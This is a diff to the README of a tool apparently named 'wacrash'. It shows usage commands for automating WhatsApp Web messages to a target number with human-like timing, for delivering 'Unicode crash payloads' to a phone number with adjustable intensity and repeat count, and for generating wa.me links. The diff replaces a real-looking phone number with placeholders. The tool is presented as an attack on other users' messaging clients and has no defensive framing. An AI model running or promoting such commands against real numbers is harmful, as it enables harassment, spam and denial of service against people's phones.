@@ -48,7 +48,7 @@ pkill -9 geckodriver 2>/dev/null; sleep 1
 geckodriver --port 4444 &
 
 # 4. Run it
-./wacrash web --target 923132594933 --message "hi" --count 5 --delay 2
+./wacrash web --target phone --message "hi" --count 5 --delay 2
 ```
 
 ---
@@ -78,7 +78,7 @@ Launch Firefox, navigate to target chat, send messages with human-like timing.
 Generate and deliver Unicode crash payloads.
 
 ```
-./wacrash crash --code 92 --phone 3132594933 --intensity 3 --count 3
+./wacrash crash --code 91 --phone  --intensity 3 --count 3
 ```
 
 | Flag | Default | Description |
@@ -94,7 +94,7 @@ Generate and deliver Unicode crash payloads.
 ### `link` — wa.me Link Generator
 
 ```
-./wacrash link --code 92 --phone 3132594933 --message "hello"
+./wacrash link --code 91 --phone  --message "hello"
 ```
 
 ### `session` — Profile Management
